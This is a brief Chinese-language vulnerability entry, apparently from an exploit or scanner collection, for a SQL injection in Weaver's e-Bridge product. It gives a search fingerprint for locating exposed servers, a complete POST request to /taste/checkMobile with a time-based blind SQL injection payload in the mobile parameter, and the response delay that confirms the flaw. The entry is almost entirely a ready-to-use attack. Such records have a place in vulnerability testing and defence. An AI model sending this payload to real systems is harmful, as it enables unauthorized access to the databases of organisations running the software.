# 泛微-云桥e-BridgecheckMobileSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微云桥e-Bridge"`
- **请求**：`POST /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s